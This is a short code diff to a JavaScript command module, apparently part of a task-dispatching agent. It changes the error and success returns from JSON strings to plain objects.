@@ -27,8 +27,8 @@ exports.run = function(task, command, params){
             response = "launched program";
         }
     }catch(error){
-        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
+        return {"user_output":error.toString(), "completed": true, "status": "error"};
     }
-	return JSON.stringify({"user_output":response, "completed": true});
+	return {"user_output":response, "completed": true};
 };
 COMMAND_ENDS_HERE
